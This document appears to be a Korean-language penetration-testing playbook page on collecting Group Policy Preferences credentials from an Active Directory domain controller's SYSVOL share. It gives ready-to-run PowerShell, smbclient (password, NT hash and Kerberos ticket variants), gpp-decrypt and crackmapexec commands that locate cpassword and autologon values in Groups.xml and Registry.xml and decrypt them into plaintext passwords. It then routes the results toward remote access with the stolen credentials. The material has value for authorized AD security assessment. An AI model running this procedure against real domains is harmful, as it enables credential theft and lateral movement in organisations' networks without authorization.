---
tags:
  - 환경/ad
  - 서비스/smb
시작조건: ["요청자 도메인 계정의 비밀번호·NT hash·Kerberos ticket 또는 현재 Windows 도메인 세션 확보", "실행 호스트에서 DC의 SYSVOL 공유 접근 가능"]
필요권한: ["요청자 도메인 계정의 SYSVOL 및 GPP XML 읽기 권한"]
필요조건: ["Domain Controller와 도메인명", "SMB 445/TCP 접근", "Groups.xml 또는 Registry.xml 경로"]
결과: ["GPP cpassword에서 복호화한 평문 비밀번호 후보", "autologon 계정·도메인·비밀번호 후보"]
---

# SYSVOL GPP 자격 증명 수집

## 한 줄 판단

요청자 도메인 계정으로 DC의 SYSVOL을 읽을 수 있으면 GPP XML의 공격 대상 계정명, `cpassword`와 autologon 값을 찾아 평문 비밀번호 후보로 복호화하고 적용 GPO·호스트 범위를 확인한다.

## 사용할 때

- 현재 보유 정보: SYSVOL을 읽을 요청자 도메인 계정의 인증 수단과 DC·도메인명을 알고 있다.
- 명령 실행 위치와 도달성: Windows 호스트에서 UNC 경로를 읽거나 Linux 호스트에서 SMB 도구로 DC 445/TCP에 접근할 수 있다.
- 현재 가능한 행동과 결과: 요청자 계정으로 `Groups.xml`·`Registry.xml`을 읽고 GPP 자격 증명 후보를 수집할 수 있지만 XML에 기록된 공격 대상 계정과 요청자 계정을 구분하고 현재 유효성을 별도로 검증한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 실행 호스트에서 DC 445/TCP와 `\\<DC>\SYSVOL\<DOMAIN>` 접근 가능 | UNC 또는 SMB 클라이언트로 `SYSVOL` 목록 확인 | DNS·라우팅·방화벽, DC 이름과 도메인 경로 확인 |
| 현재 계정 또는 인증 수단 | 요청자 도메인 계정의 현재 Windows 세션, 비밀번호·NT hash 또는 Kerberos ticket 확보 | SMB 인증 결과에서 요청자 도메인·사용자 확인 | 로컬·도메인 계정, hash 소유자와 ccache principal 확인 |
| 현재 권한 | 요청자 계정이 `SYSVOL`과 대상 XML을 읽을 수 있음 | 디렉터리 목록과 개별 파일 읽기를 각각 확인 | 공유 읽기와 개별 파일 ACL을 분리해 확인 |
| 공격 대상의 조건 | `Groups.xml`의 `cpassword` 또는 `Registry.xml`의 autologon 값 식별 | XML 속성, GPO 경로와 적용 대상 확인 | 일반 스크립트와 파일은 [[SMB 공유 자격증명 수집]]으로 확인 |

## 실행

### SYSVOL 요청자 인증 방식 선택

| 현재 보유 상태 | 사용할 방식 | 추가로 확인할 조건 |
|---|---|---|
| 도메인 사용자로 로그인한 Windows 세션 | 현재 Windows logon token으로 UNC 접근 | 현재 `whoami`와 `\\<DC>\SYSVOL` 접근 결과 |
| `<REQUESTER>`의 평문 비밀번호 | Samba 비밀번호 인증 | 도메인·사용자 형식과 비밀번호 유효성 |
| `<REQUESTER>`의 NT hash | Samba `--pw-nt-hash` | NT hash가 요청자 계정에 속함 |
| `<REQUESTER>`의 유효한 TGT 또는 CIFS ticket | Kerberos ccache | DC FQDN, realm·DNS·시간과 `cifs/<DC_FQDN>` ticket 정상 |

### Windows 공격 호스트에서 GPP XML 찾기

```powershell
whoami
Get-ChildItem \\<DC>\SYSVOL\<DOMAIN> -Recurse -Include Groups.xml,Registry.xml
Select-String -Path \\<DC>\SYSVOL\<DOMAIN>\Policies\*\Machine\Preferences\*\*.xml -Pattern 'cpassword|DefaultUserName|DefaultPassword'
```

확인할 출력:

- `cpassword`, 공격 대상 사용자명, GPO GUID 경로와 autologon 값.
- 문자열 발견과 XML 읽기 성공을 구분하고 파일의 적용 GPO·호스트를 확인한다.

### Linux 공격 호스트에서 SYSVOL 접근

#### 요청자 평문 비밀번호 사용

```bash
smbclient //<DC>/SYSVOL -W <DOMAIN> -U '<REQUESTER>%<PASSWORD>' -c 'cd <DOMAIN>; ls'
```

#### 요청자 NT hash 사용

```bash
smbclient //<DC>/SYSVOL -W <DOMAIN> -U '<REQUESTER>%<NT_HASH>' --pw-nt-hash -c 'cd <DOMAIN>; ls'
```

`<NT_HASH>`는 XML에서 찾는 공격 대상 계정의 hash가 아니라 SYSVOL을 읽을 `<REQUESTER>`의 NT hash다.

#### 요청자 Kerberos ccache 사용

```bash
klist -c <CCACHE_FILE>
smbclient //<DC_FQDN>/SYSVOL --use-kerberos=required --use-krb5-ccache=<CCACHE_FILE> -N -c 'cd <DOMAIN>; ls'
```

`-N`은 비밀번호 입력을 생략하고 지정한 ccache를 사용하기 위한 옵션이며 익명 SYSVOL 접근으로 바뀌는 것이 아니다.

### GPP cpassword 복호화

`Groups.xml` 등에서 `cpassword` 전체 값을 확인한 경우에만 실행한다.

```bash
gpp-decrypt '<CPASSWORD>'
```

확인할 출력:

- 복호화된 평문 비밀번호 후보.
- XML의 공격 대상 사용자명, 값이 적용되는 그룹·호스트와 GPO 경로.

### GPP와 autologon 모듈 확인

```bash
crackmapexec smb -L | grep gpp
crackmapexec smb <DC> -u '<REQUESTER>' -p '<PASSWORD>' -M gpp_autologin
```

확인할 출력:

- `gpp_password`, `gpp_autologin` 모듈의 존재.
- `Found SYSVOL share`, `Searching for Registry.xml`, `Found credentials`.
- `Usernames`, `Domains`, `Passwords`로 반환된 autologon credential 후보.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `gpp-decrypt`가 평문을 반환 | `cpassword` 복호화 성공 | GPP 평문 비밀번호 후보 | XML의 공격 대상 사용자명·적용 호스트와 계정 상태 확인 |
| `Found credentials`와 사용자·도메인·비밀번호 반환 | GPO autologon credential 발견 | credential 후보 | [[확보한 자격 증명으로 원격 접근 경로 선택]]에서 실제 인증 검증 |
| 계정이 삭제·잠김·비활성 상태 | 해당 credential로 현재 인증할 수 없음 | 직접 인증 실패 | XML 최신성, 적용 호스트와 계정 상태 확인 |
| SYSVOL은 보이나 GPP XML이 없음 | 기본 읽기만 확인 | credential 미발견 | 일반 공유와 스크립트는 [[SMB 공유 자격증명 수집]]으로 확인 |

## 확인할 출력과 권한

- XML 발견, 평문 복호화와 실제 서비스 인증을 서로 다른 성공 단계로 기록한다.
- GPP 비밀번호는 오래된 계정에 연결될 수 있으므로 현재 유효성을 별도 검증한다.
- SYSVOL을 읽은 요청자 도메인 계정과 XML에 기록된 공격 대상 계정은 서로 다른 Identity다.

## 관련 서비스

- [[SMB 서비스]]

## 관련 도구

- [[gpp-decrypt]]
- [[crackmapexec]]
- [[smbclient]]
- [[klist]]

## 관련 상태 라우터

- [[AD Identity 확인 후 도메인 컨텍스트 열거]]
- [[확보한 자격 증명으로 원격 접근 경로 선택]]
